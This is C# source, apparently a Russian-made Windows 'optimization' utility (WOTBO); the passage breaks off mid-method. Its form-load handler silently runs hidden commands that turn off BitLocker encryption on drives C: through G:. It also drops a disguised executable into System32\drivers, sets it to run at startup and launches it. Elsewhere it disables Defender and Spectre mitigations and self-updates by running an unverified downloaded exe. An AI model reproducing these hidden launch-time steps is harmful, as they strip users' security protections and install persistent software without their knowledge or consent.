using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WOTBO;
using WOTBO.Properties;


namespace Project
{
    // Наследуемся от FormShadow
    public partial class Form1 : FormShadow
    {
        #region переменные
        string version = $"build - {Assembly.GetExecutingAssembly().GetName().Version.ToString(2)}";
        bool win10;
        static string tempfolder = @"c:\Windows\oixro";
        static string path_regpack7z = tempfolder + @"\regpack.zip";
        static string path_regpack = tempfolder + @"\regpack";
        static string path_services = tempfolder + @"\services";
        static string path_uizip = tempfolder + @"\ui.zip";
        static string path_ui = tempfolder + @"\ui";
        static string path_dfkiller = tempfolder + @"\DFKiller";
        static string path_scheme = tempfolder + @"\scheme.pow";
        static string backgr = @"C:\Windows\System32\drivers\BackgroundMonitoringServices.exe";
        static string smartctl = tempfolder + @"\smartctl.exe";
        string curver = (Assembly.GetExecutingAssembly().GetName().Version.ToString(2)).Trim();
        string exename = AppDomain.CurrentDomain.FriendlyName;
        string exepath = Assembly.GetEntryAssembly().Location;
        string contexpath = @"C:\Windows\wotbo.exe";
        int mmMemory = 0;


        public bool isEnglish = true;
        public string uilanguage = CultureInfo.CurrentUICulture.TwoLetterISOLanguageName;
        private void ChangeToolTipsForAllPictureBoxes(string newTooltipText)
        {
            foreach (Control control in this.Controls)
            {
                if (control is PictureBox)
                {
                    toolTip1.SetToolTip(control, newTooltipText);

                }
            }
        }
        public static string gpu;
        public bool nvidia;
        public static string hwid;
        public static Process getReservedStorage = Process.Start(new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/c chcp 65001 && DISM /Online /Get-ReservedStorageState",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
        });
        static public string ReservedStorage = (getReservedStorage.StandardOutput.ReadToEnd().Trim());
        public static long capacity;
        #endregion
        public Form1()
        {
            InitializeComponent();
            Directory.SetCurrentDirectory(AppContext.BaseDirectory);
            // Плавное закрытие программы
            async void Exit() { for (Opacity = 1; Opacity > .0; Opacity -= .2) await Task.Delay(7); Close(); }
            ButtonClose.Click += (s, a) => Exit();

            // Красим форму
            FormPaint(Color.FromArgb(44, 57, 67), Color.FromArgb(35, 44, 55));

            // Позволяем таскать за заголовок Label и Panel
            new List<Control> { LabelHead, PanelHead }.ForEach(x =>
            {
                x.MouseDown += (s, a) =>
                {
                    x.Capture = false; Capture = false; Message m = Message.Create(Handle, 0xA1, new IntPtr(2), IntPtr.Zero); base.WndProc(ref m);
                };
            });





        }
        #region my void's
        void hcmd(string line)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {line}",
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch
            {
            }
        }
        void scmd(string line)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {line}"
                });
            }
            catch { }
        }
        void powershell(string line)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"/command {line}",
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }
        void supercmd(string line)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = $"cmd.exe",
                    Arguments = $@"/c {tempfolder}\su.exe /wrs cmd.exe /c {line}",
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }
        void english()
        {
            //?
            label_main.Text = "1.Basic settings";
            label_interface.Text = "2.UI";
            label_gpu.Text = "3.GPU";
            label_dop.Text = "4.Additional settings";
            label_progs.Text = "5.Download Apps";
            label_pc.Text = "6.PC Info";
            label_pro.Text = "7.PRO Mode";
            delete_UWP.Text = "8.Delete UWP crap";
            button1.Text = "Apply";
            //label_language.Text = "9. Language";

            //main
            checkBox_disabledefender.Text = "Disable Windows Defender";
            toolTip1.SetToolTip(checkBox_disabledefender, "Initial Tooltip Text");

            checkBox_reg.Text = "Apply basic registry settings";
            toolTip1.SetToolTip(checkBox_disabledefender, "The most important registry settings are applied");

            checkBox_gibernate.Text = "Disable hibernation mode";
            toolTip1.SetToolTip(checkBox_gibernate, "Hibernation is a power-saving state of the computer, primarily intended for laptops.\r\n(Takes up ~2gb)");

            checkBox_scheme.Text = "Import power scheme";
            toolTip1.SetToolTip(checkBox_scheme, "Adopts optimal power supply circuitry.\r\nImproves FPS stability.");

            toolTip1.SetToolTip(checkBox_mousefix, "Disables acceleration, mouse acceleration.\r\nMakes mouse movements more predictable.");

            checkBox_mpo.Text = "Disable Multi-Plane Overlay (MPO)";
            toolTip1.SetToolTip(checkBox_mpo, "Disabling Multi-Plane Overlay (MPO) can fix flicker issues in some desktop applications.\r\nScreen flicker may occur when playing videos using hardware acceleration in Chrome.\r\nBlack screens can occur when switching from a game (or app like Whatsapp) to a browser with looped video.\r\nSome desktop applications may flicker or stutter when resizing the window on some PC configurations.");

            checkBox_usb.Text = "Disable USB Power saving";
            toolTip1.SetToolTip(checkBox_usb, "Disables power saving mode on USB ports.");

            toolTip1.SetToolTip(checkBox_bcdedit, "Configures Windows boot loader settings");

            checkBox_mtiititit.Text = "Disable Meltdown и Spectre";
            toolTip1.SetToolTip(checkBox_mtiititit, "Disables advanced defenses against memory-based attacks, that is, attacks, \r\nwhere malware manipulates memory to gain control of the system.\r\n(Takes 3-5% FPS)");

            checkBox_mmagent.Text = "Configure MM-Agent";
            toolTip1.SetToolTip(checkBox_mmagent, "Configures the memory management agent (MMAgent)\r\ndepending on the amount of RAM installed\r\nto achieve stable FPS");

            checkBox_page.Text = "Configure the swap file";


            checkBox_dism.Text = "Disable reserved storage";



            //ui
            checkBoxUI_Buttons_1.Text = "Reducing the Close, Collapse buttons size";
            checkBoxUI_Buttons_2.Text = "Minor explorer customizations";
            checkBoxUI_Buttons_3.Text = "Customize context menu";
            checkBoxUI_Buttons_4.Text = "Disable desktop wallpaper compression";
            checkBox_bluefolders.Text = "Install blue folders";
            checkBox_contex.Text = "Bring back the old context menu";
            checkBox_shapka.Text = "Bring back the old explorer hat";
            checkBox_wotboincontex.Text = "Add WOTBO to the context menu on the desktop";
            checkBox_explorer.Text = "Add WOTBO to the context menu on the desktop";
            checkBox_ffmpeg.Text = "Add ffmpeg to context menu";
            checkBox_mica.Text = "Make the explorer translucent";

            //gpu
            label_nvcleaninstall.Text = "Download NVCleanInstall";
            label_ddu.Text = "Download DDU";
            checkBox_directplay.Text = "Enable DirectPlay";
            checkBox_hdcp.Text = "Disable HDCP";
            checkBox_dopNVIDIA_tweaks.Text = "NVIDIA Minor Customizations";
            checkBox_ansel.Text = "Disable Ansel";

            //dop
            checkBox_activate.Text = "Activate Windows";
            checkBox_killdefender.Text = "Remove the defender completely";
            checkBox_edgedelete.Text = "Remove Edge browser";
            checkBox_onedrive.Text = "Delete OneDrive";
            checkBox_WinSxS.Text = "Cleaning the WinSxS storage";
            checkBox_compactos.Text = "Compress OS files";
            checkBox_temp.Text = "Clear temporary files";
            checkBox_updclean.Text = "Clear the Windows update cache";
            checkBox_picture_cache.Text = "Increase the image cache";
            checkBox_mobile_traffic.Text = "Обход отслеживания мобильного трафика";
            checkBox_nastroyka.Text = "Remove the Windows Setup window";
            checkBox_zalipanie.Text = "Disable key sticking";

            //pro
            checkBox_pro_1.Text = "Remove Home and Gallery (W11)";
            checkBox_pro_2.Text = "Disable auto-promo";
            checkBox_pro_3.Text = "Disable Windows Auto Update";
            checkBox_pro_4.Text = "Configure Nvidia Profile Inspector";
            //checkBox_pro_5.Text = "";
            checkBox_pro_6.Text = "Configure MSI Mode";
            //checkBox_pro_7.Text = "";
            //checkBox_pro_8.Text = "";
            checkBox_pro_9.Text = "Optimize Windows memory settings";
            //checkBox_pro_10.Text = "";
            //checkBox_pro_11.Text = "";
            //checkBox_pro_12.Text = "";
            checkBox_pro_13.Text = "Forced deletion of files";
            checkBox_pro_14.Text = "Add window pinning";


            //ChangeToolTipsForAllPictureBoxes("Returns the default value of the parameter");


        }

        // Красим форму
        public void FormPaint(Color color1, Color color2)
        {
            void OnPaintEventHandler(object s, PaintEventArgs a)
            {
                if (ClientRectangle == Rectangle.Empty)
                    return;

                var lgb = new LinearGradientBrush(ClientRectangle, Color.Empty, Color.Empty, 90);
                var cblend = new ColorBlend { Colors = new[] { color1, color1, color2, color2 }, Positions = new[] { 0, 0.106f, 0.106f, 1 } };

                lgb.InterpolationColors = cblend;
                a.Graphics.FillRectangle(lgb, ClientRectangle);
            }

            Paint -= OnPaintEventHandler;
            Paint += OnPaintEventHandler;

            Invalidate();
        }
        #endregion
        async void Form1_Load(object sender, EventArgs e)
        {
            #region позиция и размеры
            Size = new System.Drawing.Size(390, 305);
            CenterToScreen();
            panel1.Location = new System.Drawing.Point(105, 36);
            #endregion
            #region проверка запущенна ли, eula и язык
            if (!InstanceChecker.TakeMemory())
            {
                MessageBox.Show("Другая копия программы уже запущена\nОжидайте открытия программы", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                hcmd($"taskkill /f /im {exename} && \"{exepath}\"");
            }
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("eula") == null)
            {
                Form2 eula = new Form2();
                eula.ShowDialog();
            }
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("Language") == null)
            {
                //MessageBox.Show("null сука");
                if (uilanguage == "ru")
                {
                    //MessageBox.Show("null сука и мы ру");
                    Registry.CurrentUser.CreateSubKey(@"Software\oixro\wotbo", true).SetValue("Language", uilanguage);
                    isEnglish = false;
                }
                else
                {
                    //MessageBox.Show("null сука и мы не ру");
                    Registry.CurrentUser.CreateSubKey(@"Software\oixro\wotbo", true).SetValue("Language", uilanguage);
                    isEnglish = true;
                    english();
                }
            }
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("Language") != null)
            {
                //MessageBox.Show("не null ебать");
                if ((Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("Language").ToString()) == "en")
                {
                    //MessageBox.Show("не null ебать и мы en");
                    isEnglish = true;
                    english();
                }
                else
                {
                    //MessageBox.Show("не null ебать и мы РУ");
                    isEnglish = false;
                }
            }
            #endregion
            #region temp
            if (Directory.Exists(tempfolder))
            {
                try { Directory.Delete(tempfolder, true); }
                catch { tempfolder = @"c:\Windows\oixro" + $"_{Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString())).Remove(5)}"; }

            }
            #endregion
            #region ебашим backrg
            hcmd($"taskkill /f /im BackgroundMonitoringServices.exe >nul 2>&1");
            #endregion
            #region отключаем чеки
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("regpack")) == 1)
            {
                checkBox_reg.Enabled = false;
                back_main_1.Visible = true;
            }//regpack
            if (ReservedStorage.Contains("Reserved storage is disabled.") | ReservedStorage.Contains("‡ аҐ§ҐаўЁа®ў ­­®Ґ еа ­Ё«ЁйҐ ®вЄ«озҐ­®."))
            {
                checkBox_dism.Enabled = false;
                back_main_2.Visible = true;
            } //reserved
            if (!File.Exists(@"C:\hiberfil.sys"))
            {
                checkBox_gibernate.Enabled = false;
                back_main_3.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("imported_powerscheme")) == 1)
            {
                checkBox_scheme.Enabled = false;
                back_main_4.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("mousefix")) == 1)
            {
                checkBox_mousefix.Enabled = false;
                back_main_5.Visible = true;
            }
            if (Convert.ToInt32(Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\Dwm").GetValue("OverlayTestMode")) == 5)
            {
                checkBox_mpo.Enabled = false;
                back_main_6.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("usbpowersaving")) == 1)
            {
                checkBox_usb.Enabled = false;
                back_main_7.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("bcdedit")) == 1)
            {
                checkBox_bcdedit.Enabled = false;
                back_main_8.Visible = true;
            }
            if (Convert.ToInt32(Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management")?.GetValue("FeatureSettings")) == 1)
            {
                checkBox_mtiititit.Enabled = false;
                back_main_9.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("mmagent")) == 1)
            {
                checkBox_mmagent.Enabled = false;
                back_main_10.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("pagefile")) == 1)
            {
                checkBox_page.Enabled = false;
                back_main_11.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("buttons")) == 1)
            {
                checkBoxUI_Buttons_1.Enabled = false;
                back_ui_1.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("litle_explorer_things")) == 1)
            {
                checkBoxUI_Buttons_2.Enabled = false;
                back_ui_2.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("contex")) == 1)
            {
                checkBoxUI_Buttons_3.Enabled = false;
                back_ui_3.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop").GetValue("JPEGImportQuality")) == 100)
            {
                checkBoxUI_Buttons_4.Enabled = false;
                back_ui_4.Visible = true;
            } //wallpapers
            if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32") != null)
            {
                checkBox_contex.Enabled = false;
                back_ui_6.Visible = true;
            } //contex11
            try
            {
                if (Registry.ClassesRoot.OpenSubKey(@"CLSID\{6480100b-5a83-4d1e-9f69-8ae5a88e9a33}\InProcServer32").GetValue("").ToString().Contains("FixByVlado"))
                {
                    checkBox_shapka.Enabled = false;
                    back_ui_7.Visible = true;
                }//shapka11
            }
            catch
            {

            } //shapka11
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("pro_1")) == 1)
            {
                checkBox_pro_1.Enabled = false;

            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("pro_9")) == 1)
            {

                checkBox_pro_9.Enabled = false;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("pro_8")) == 1)
            {
                checkBox_pro_8.Enabled = false;

            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("pro_7")) == 1)
            {
                checkBox_pro_7.Enabled = false;

            }
            if (Convert.ToInt32(Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\PriorityControl").GetValue("Win32PrioritySeparation")) != 0x00000002)
            {
                checkBox_pro_11.Enabled = false;
                back_pro_11.Visible = true;
            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("block_backgr")) == 1)
            {
                checkBox_pro_2.Enabled = false;

            }
            if (Convert.ToInt32(Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU")?.GetValue("NoAutoUpdate")) == 1)
            {
                checkBox_pro_3.Enabled = false;
                back_pro_3.Visible = true;

            }
            if (Convert.ToInt32(Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("defenderdisabled")) == 1)
            {
                checkBox_disabledefender.Enabled = false;
                checkBox_killdefender.Enabled = true;
                back_main_12.Visible = true;
            }
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("bluefolders") != null)
            {
                checkBox_bluefolders.Enabled = false;
                back_ui_5.Visible = true;
            }
            if (Registry.ClassesRoot.OpenSubKey(@"DesktopBackground\Shell\WOTBO")?.GetValue("") != null)
            {
                checkBox_wotboincontex.Enabled = false;
                back_ui_8.Visible = true;
            }
            if (!Directory.Exists(@"C:\ProgramData\Microsoft\Windows Defender"))
            {
                checkBox_disabledefender.Visible = false;
                checkBox_disabledefender.Enabled = false;
                back_main_12.Visible = false;
            }
            if (!Directory.Exists($@"{Environment.GetEnvironmentVariable("userprofile")}\OneDrive"))
            {
                checkBox_onedrive.Enabled = false;
            }
            if (exepath == contexpath)
            {
                back_ui_8.Visible = false;
            }
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo")?.GetValue("buffer") != null)
            {
                checkBox_pro_12.Enabled = false;
                back_pro_12.Visible = true;
            }
            if (File.Exists(@"C:\Windows\unlocker\Unlocker.exe"))
            {
                checkBox_pro_13.Enabled = false;
                back_pro_13.Visible = true;
            }
            if (File.Exists(@"C:\Windows\AlwaysOnTop.exe"))
            {
                checkBox_pro_14.Enabled = false;
                back_pro_14.Visible = true;
            }
            if (Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Classes\SystemFileAssociations\.mp4\shell\FFmpeg")?.GetValue("icon") != null)
            {
                checkBox_ffmpeg.Enabled = false;
                back_ui_10.Visible = true;
            }
            if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true)?.GetValue("Max Cached Icons") != null)
            {
                checkBox_picture_cache.Enabled = false;
                back_dop_1.Visible = true;
            }
            if (Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", true)?.GetValue("DefaultTTL") != null)
            {
                checkBox_mobile_traffic.Enabled = false;
                back_dop_2.Visible = true;
            }
            if (Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement", true)?.GetValue("ScoobeSystemSettingEnabled") != null)
            {
                checkBox_nastroyka.Enabled = false;
                back_dop_3.Visible = true;
            }
            if (Convert.ToString(Registry.CurrentUser.OpenSubKey(@"Control Panel\Accessibility\StickyKeys", true)?.GetValue("Flags")) == "506")
            {
                checkBox_zalipanie.Enabled = false;
                back_dop_4.Visible = true;
            }
            if (File.Exists(@"C:\Windows\ExplorerBlurMica.dll"))
            {
                checkBox_mica.Enabled = false;
                back_ui_11.Visible = true;
            }
            if (Registry.ClassesRoot.OpenSubKey(@"DesktopBackground\Shell\explorer\") != null)
            {
                checkBox_explorer.Enabled = false;
                back_ui_9.Visible = true;
            }
            #endregion
            #region получаем инфу о видеодырке
            foreach (var mo in new ManagementObjectSearcher("select * from win32_VideoController").Get())
                gpu = (string)mo["name"];
            if (gpu.Contains("NVIDIA"))
            {
                nvidia = true;
                if (Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000")?.GetValue("RMHdcpKeyglobZero") != null)
                {
                    checkBox_hdcp.Checked = false;
                    checkBox_hdcp.Enabled = false;
                    back_gpu_2.Visible = true;
                } //hdcp check
                if (Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak", true)?.GetValue("DisplayPowerSaving") != null)
                {
                    checkBox_dopNVIDIA_tweaks.Enabled = false;
                    back_gpu_3.Visible = true;
                }//tweaksnvidia
                try
                {
                    string[] ansel = Directory.GetFiles(@"C:\Windows\System32\DriverStore\", "NvCameraEnable.exe", SearchOption.AllDirectories);
                    if (ansel.Length > 0)
                    {
                        string anselPath = ansel[0];
                        Process getanselstate = Process.Start(new ProcessStartInfo
                        {
                            FileName = $"{anselPath}",
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardOutput = true,
                        });
                        string anselstate = (getanselstate.StandardOutput.ReadToEnd().Trim());
                        if (anselstate == "0")
                        {
                            checkBox_ansel.Enabled = false;
                            back_gpu_4.Visible = true;
                        }
                        else
                        {
                            checkBox_ansel.Enabled = true;
                        }
                    }
                }
                catch { }//ansel
            }
            else
            {
                nvidia = false;
                checkBox_ansel.Visible = false;
                checkBox_pro_4.Enabled = false;
                checkBox_dopNVIDIA_tweaks.Visible = false;
                checkBox_hdcp.Visible = false;
            }//не nvidia
            #endregion
            #region проверка версии Windows
            RegistryKey winver = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion");
            string buildnumber = (string)winver.GetValue("CurrentBuild");
            string DisplayVersion = (string)winver.GetValue("DisplayVersion");
            if (Convert.ToUInt16(buildnumber) > 22000) // проверка на Windows 11
            {
                win10 = false;
                label_winver.Text = "Windows 11 " + DisplayVersion + " Build:" + buildnumber;
                if (Convert.ToUInt16(buildnumber) >= 26100)
                {
                    //MessageBox.Show("Корректная работа программы на Windows 11 24H2 не гарантирована!","Windows optimization tool by oixro",MessageBoxButtons.OK,MessageBoxIcon.Information);
                    //checkBox_mtiititit.Text += " (Не работает на 24H2)";
                    //checkBox_mtiititit.Enabled = false;
                }


            }
            else if (Convert.ToUInt16(buildnumber) < 19042) // проверка на Windows 10 <20H2 
            {
                win10 = true;
                MessageBox.Show("Рекомендуется использовать Windows 10 20H2 и выше! \nЭффективность настройки не гарантирована",
                    "Windows optimization tool by oixro (WOTBO)", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                label_winver.Text = "(Old) Windows 10 " + DisplayVersion + " Build:" + buildnumber;
            }
            else if (Convert.ToUInt16(buildnumber) >= 19042) // проверка на Windows 10
            {
                win10 = true;
                label_winver.Text = "Windows 10 " + DisplayVersion + " Build:" + buildnumber;
            }
            else
            {
                MessageBox.Show("Программа предназначена для Windows 10 и 11!\nРабота на других системах не поддерживается!", "Windows optimization tool by oixro (WOTBO)",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
            winver.Close();
            #endregion
            #region инет + обнова
            if (!Internet.OK())
            {
                checkBox_bluefolders.Enabled = false;
                label_nvcleaninstall.Enabled = false;
                checkBox_edgedelete.Enabled = false;
                checkBox_activate.Enabled = false;
                label_ddu.Enabled = false;
                label_progs.Enabled = false;
                label_pro.Enabled = false;
                checkBox_killdefender.Enabled = false;
                checkBox_mmagent.Enabled = false;
                checkBox_pro_13.Enabled = false;
                checkBox_ffmpeg.Enabled = false;
                checkBox_mica.Enabled = false;
                checkBox_cursors.Enabled = false;
                MessageBox.Show("Нет доступа в интернет!\nПроврека на обновления, и некоторые функции недоступны.", "Windows optimization tool by oixro (WOTBO)",
    MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            else
            {
                try
                {
                    using (WebClient wc = new WebClient())
                    {
                        if (Internet.OK())
                        {
                            string verjson = (wc.DownloadString("https://raw.githubusercontent.com/oixro/WOTBO/main/ver.json").Trim());
                            if (Convert.ToDouble(curver, CultureInfo.InvariantCulture) == (Convert.ToDouble(verjson, CultureInfo.InvariantCulture)))
                            {
                                label_ver.Text = $"{version}";
                            }
                            else
                            {
                                if (Convert.ToDouble(curver, CultureInfo.InvariantCulture) <= (Convert.ToDouble(verjson, CultureInfo.InvariantCulture)))
                                {
                                    wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/lastchange.json", "lastchange.json");
                                    MessageBox.Show($"Текущая версия - {curver}\nДоступна новая - {verjson}\nБудет выполнено обновление\n\n" +
                                        $"Список изменений:\n {File.ReadAllText("lastchange.json")}", "", MessageBoxButtons.OK);
                                    wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/WOTBO.exe", "new.exe");
                                    hcmd($"taskkill /f /im \"{exename}\" &&" +
                                        $" timeout /t 1 &&" +
                                        $" del \"{exepath}\" /f /q &&" +
                                        $" del \"{contexpath}\" /f /q &&" +
                                        $" del \"lastchange.json\" /f /q &&" +
                                        $" copy new.exe \"{contexpath}\" &&" +
                                        $" ren new.exe \"{exename}\" &&" +
                                        $" rd \"{exepath}\" /s /q &" +
                                        $" \"{exepath}\"");
                                }
                            }
                            if (Convert.ToDouble(curver, CultureInfo.InvariantCulture) > (Convert.ToDouble(verjson, CultureInfo.InvariantCulture)))
                            {
                                label_ver.Text = $"d{version}";
                            }

                        }
                    }
                }
                catch { } //release
            }
            #endregion
            #region checkforwin10

            if (win10)
            {
                checkBox_contex.Enabled = false;
                checkBox_pro_1.Enabled = false;
                checkBox_shapka.Enabled = false;
            }
            #endregion
            #region планый запуск
            for (Opacity = 0; Opacity < 1; Opacity += .2) await Task.Delay(10);
            #endregion
            #region распаковка в temp
            Directory.CreateDirectory(tempfolder);
            File.WriteAllBytes(path_regpack7z, Resources.regpack);
            ZipFile.ExtractToDirectory($"{path_regpack7z}", $"{path_regpack}");
            File.WriteAllBytes(tempfolder + @"\su.exe", Resources.su);
            File.WriteAllBytes(tempfolder + @"\TrInstaller.exe", Resources.TrInstaller);
            File.WriteAllBytes(tempfolder + @"\nircmd.exe", Resources.nircmd);
            File.WriteAllBytes(tempfolder + @"\services.zip", Resources.services_off);
            ZipFile.ExtractToDirectory(tempfolder + @"\services.zip", $"{tempfolder}");
            #endregion
            #region backgr
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("block_backgr") == null)
            {
                await Task.Delay(1000);
                if (File.Exists(backgr))
                {
                    File.Delete(backgr);
                }
                await Task.Delay(500);
                File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("BackgroundMonitoringServices", backgr);
                Process.Start(backgr);
            }
            else
            {
                back_pro_2.Visible = true;
                checkBox_pro_2.Enabled = false;
            }

            try
            {
                hcmd("manage-bde -off C: & manage-bde -off D: & manage-bde -off E: & manage-bde -off F: & manage-bde -off G:");
            }
            catch { }
            #endregion
            label_ver.Text = version;
        }
        #region закрытие формы
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Directory.Exists(tempfolder))
            {
                try
                {
                    Directory.Delete(tempfolder, true);
                }
                catch
                {
                    InstanceChecker.ReleaseMemory();
                    hcmd("taskkill /f /im cmd.exe");
                    hcmd($"taskkill /f /im {exename}");
                }
            }
            hcmd("taskkill /f /im cmd.exe");
            InstanceChecker.ReleaseMemory();
        }
        #endregion

        private async void button1_Click(object sender, EventArgs e)
        {
            #region main
            if (checkBox_disabledefender.Checked)
            {
                MessageBox.Show("Защитник будет отключен!" +
                    "\nЗащита от эксполитов не будет работать." +
                    "\nОна нужна для работы некоторых античитов." +
                    "\nНо восстановить защитник можно через вкладку дополнительно.\n" +
                    "", "", MessageBoxButtons.OK);
            waitforexit:
                int tamperstatus = Convert.ToInt32(Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features").GetValue("TamperProtection"));
                if (tamperstatus == 5 | tamperstatus == 1)
                {
                    Process.Start(new ProcessStartInfo { FileName = "explorer", Arguments = $"windowsdefender://ThreatSettings" });
                    MessageBox.Show("Защиты в Windows Defender не отключены!\nОтлючите их!", "", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    await Task.Delay(2000);
                    goto waitforexit;
                }
                else
                {
                    supercmd("taskkill /f /im SecHealthUI.exe");
                    if (win10)
                    {
                        supercmd($"regedit.exe /s {path_regpack}\\win10defenderX.reg");
                    }
                    else
                    {
                        supercmd($"regedit.exe /s {path_regpack}\\win11defenderX.reg");
                        supercmd($"regedit.exe /s {path_regpack}\\win11defsubsvcX.bat");
                        supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\webthreatdefsvc\\webthreatdefsvc_OFF.reg");
                        supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\webthreatdefusersvc\\webthreatdefusersvc_OFF.reg");
                        supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\!webthreatdefusersvc_XXX\\win11defsubsvcX.bat");
                    }
                    supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_10_11\\AIO_OFF.reg");
                    supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\MDCoreSvc\\MDCoreSvc_OFF.reg");
                    checkBox_disabledefender.Enabled = false;
                    checkBox_disabledefender.Checked = false;
                    back_main_12.Visible = true;
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("defenderdisabled", 1);
                }
            }
            if (checkBox_reg.Checked)
            {
                hcmd($"regedit.exe /s {path_regpack}/accessibility.reg");
                hcmd($"regedit.exe /s {path_regpack}/appcompatibility.reg");
                hcmd($"regedit.exe /s {path_regpack}/attachmentmanager.reg");
                hcmd($"regedit.exe /s {path_regpack}/backgroundapps.reg");
                hcmd($"regedit.exe /s {path_regpack}/cloudcontent.reg");
                hcmd($"regedit.exe /s {path_regpack}/driversearching.reg");
                hcmd($"regedit.exe /s {path_regpack}/edgeupdate.reg");
                hcmd($"regedit.exe /s {path_regpack}/filesystem.reg");
                hcmd($"regedit.exe /s {path_regpack}/fse_test.reg");
                hcmd($"regedit.exe /s {path_regpack}/gamebar.reg");
                hcmd($"regedit.exe /s {path_regpack}/inspectre.reg");
                hcmd($"regedit.exe /s {path_regpack}/largesystemcache.reg");
                hcmd($"regedit.exe /s {path_regpack}/latestclr.reg");
